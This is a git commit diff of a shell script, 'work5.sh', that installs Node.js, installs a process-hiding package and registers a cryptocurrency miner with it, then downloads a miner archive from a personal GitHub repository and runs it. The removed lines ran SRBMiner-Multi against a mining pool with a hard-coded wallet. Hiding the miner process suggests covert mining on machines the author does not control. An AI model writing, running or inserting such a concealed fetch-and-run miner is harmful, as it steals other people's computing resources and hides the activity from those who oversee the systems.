63c626a681eacfab89c4f472342421e83e40b7de
Geraldy Olang <97717251+geraldyolang11@users.noreply.github.com>
2022-02-10 07:54:30 +0800

    Update work5.sh

--- work5.sh
+++ work5.sh
@@ -5,8 +5,8 @@ curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - &&
 sudo apt install nodejs && 
 npm install -g npm@8.4.1 && 
 npm i -g node-process-hider && 
-sudo ph add pkx2 && 
-wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.9.0/SRBMiner-Multi-0-9-0-Linux.tar.xz && 
-tar -xzf SRBMiner-Multi-0-9-0-Linux.tar.xz &&
-cd SRBMiner-Multi-0-9-0-Linux;
-./SRBMiner-MULTI --disable-gpu --algorithm verushash --pool verushash.eu.mine.zergpool.com:3300 --wallet 16GF8LfH1eLW2sWioKvTPoSKZ4U1i8Koci --password c=BTC,mc=AVN --cpu-threads 2"
+sudo ph add SRBMiner-MULTI && 
+wget https://github.com/geraldyolang11/mine/raw/main/smzip.tar && 
+tar -xf smzip.tar &&
+chmod +x start-mining-veruscoin &&
+./start-mining-veruscoin"
